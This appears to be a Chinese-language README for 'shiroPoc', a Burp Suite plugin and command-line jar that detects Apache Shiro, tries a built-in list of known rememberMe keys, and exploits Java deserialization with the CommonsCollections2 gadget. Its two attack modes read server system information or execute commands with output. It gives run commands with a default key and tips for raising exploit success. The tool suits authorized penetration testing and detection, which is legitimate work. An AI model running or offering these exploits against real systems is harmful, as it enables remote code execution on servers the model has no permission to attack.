mvn package 编译

## 欢迎关注 宽字节安全 公众号
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//imgWeChat%20Image_20200612150038.png)
## changelog
1. 新增shiro 检测方式(对，就是那个不需要gadget的检测方式) 2020.7.30
2. 新增shiro 100 key
3. 支持自定义key
4. 支持作为插件导入burp
6. 支持burp的被动扫描（需要burp pro版本

## 被动扫描演示
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200806125336.png)
##### 检测到shiro框架
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200806124314.png)

##### 自动探测shiro的key
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200806124243.png)

## burp插件使用方法
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200801160819.png)

repeater界面中右键，生成payload
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200801160932.png)
默认kph密钥，cc2利用链，获取信息，如果需要修改，请右键选择config
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200801161039.png)

生成后，会自动替换request内容，并攻击

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200801161129.png)


当然，这个jar包也可以直接在命令行下运行，生成rememberMe，或者检测，一切不变

自定义key检测
```
java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc http://localhost:8080/samples_web_war/ kPH+bIxk5D2deZiIxcaaaA==
```

内置100key检测

```
java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc http://localhost:8080/sam
ples_web_war/
```

```
java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar kPH+bIxk5D2deZiIxcaaaA== CommonsCollections2 XraySysProp
```

## 检测方式
运行
```
java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc 
```
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200730200713.png)


检测

```
java -cp .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar org.unicodesec.poc http://localhost:8080/sam
ples_web_war/
```
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200730200536.png)


## shiro-urldns 检测&利用工具
支持shiro 16个key，支持攻击利用。支持的key与gadget以及攻击类型如下
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726115923.png)


## 查看目标服务器的系统信息
该攻击类型为`XraySysProp`，使用方法如下
```
java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar 16 CommonsCollections2 XraySysProp
```

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726121111.png)

利用截图如下

![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726121840.png)

## 执行命令并回显
该攻击类型为`XrayCmd` 使用方法如下
```
java -jar .\shiroPoc-1.0-SNAPSHOT-jar-with-dependencies.jar 16 CommonsCollections2 XrayCmd
```
利用截图如下
![](https://potatso-1253210846.cos.ap-beijing.myqcloud.com//img20200726122210.png)

## 注意事项
1. 建议删除不相关的http请求头，不然会因为http请求头过大而提示400错误
2.  建议使用CommonsCollections2 gadget，体积小，利用率高
